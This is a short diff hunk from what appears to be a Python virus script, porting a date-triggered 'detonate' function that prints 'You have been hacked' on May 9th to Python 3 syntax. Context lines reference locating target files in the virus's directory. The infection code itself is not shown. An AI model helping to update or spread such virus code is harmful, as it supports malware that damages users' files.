@@ -76,7 +76,7 @@ def detonate():
     # If the current month is May and day is 9th
     if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
         # Execute the print statement
-        print "You have been hacked"
+        print("You have been hacked")
 
 # Start with targeted files in current directory of the virus script
 files_targeted = locate(os.path.abspath(""))
